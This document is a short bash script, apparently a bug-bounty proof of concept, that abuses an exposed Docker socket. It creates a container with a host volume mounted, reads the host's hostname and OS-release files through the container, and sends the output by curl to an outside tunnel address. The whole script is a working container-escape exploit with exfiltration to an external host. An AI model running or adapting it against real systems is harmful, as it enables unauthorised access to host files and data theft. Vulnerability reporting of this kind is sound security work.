#!/bin/bash
# TARGET: gxxlv-103-95-173-113.a.free.pinggy.link:33897
TARGET="gxxlv-103-95-173-113.a.free.pinggy.link"
PORT="33897"

{
  echo "=== [!] GOOGLE VRP: HTTPS ONE-LINER PoC ==="
  echo "Timestamp: $(date)"

  # 1. Reuse the exploit volume (host_root_exploit)
  # Image: sha256:25109184c71bdad7
  CONTAINER_JSON=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
    -H "Content-Type: application/json" \
    -d '{
      "Image": "sha256:25109184c71bdad7",
      "HostConfig": { "Binds": ["host_root_exploit:/host_data:ro"] }
    }')

  ID=$(echo $CONTAINER_JSON | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)

  if [ -n "$ID" ]; then
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
    sleep 1
    
    # 2. Exfiltrate Host OS Release & Hostname
    echo "--- HOST IDENTITY ---"
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/hostname" | tar -xO
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/os-release" | tar -xO
    
    # 3. Cleanup
    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$ID?force=true" > /dev/null
  else
    echo "Container creation failed."
  fi

} | curl -k -X POST --data-binary @- "https://$TARGET:$PORT"
